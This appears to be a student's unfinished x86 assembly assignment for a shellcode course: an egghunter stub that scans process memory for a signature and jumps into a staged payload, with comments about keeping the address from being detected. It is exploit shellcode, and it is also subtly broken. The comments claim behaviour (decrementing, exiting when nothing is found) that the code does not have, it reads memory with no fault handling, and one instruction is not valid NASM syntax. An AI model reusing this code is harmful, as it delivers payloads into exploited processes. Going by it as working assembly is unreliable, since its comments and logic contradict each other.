; SLAE-XXX
; copy paste need to make it original now
; assignment 3 : egghunter shellcode 
; originality : dec instead of inc, exit if not found after analyzing full memory 

global _start

section .text

_start:
 xor eax,eax; 
 mov ebx, dword 0xCCCCCCCB ; egg signature is different from what is hardcoded here , its a trick to not detect this exact address 
 inc ebx ; final egg code is in ebx

next_addr:
 inc eax    ; increasing memory address to look at next address
 cmp dword [eax], ebx ; check if our egg is at that memory address, if yes set ZF = 1
 jne next_addr  ; if ZF = 0 (check failed), then jmp to next_addr
 lea ebx,eax+0x4 
 jmp ebx ; if eax contains our eggcode, jump after it no ?
 
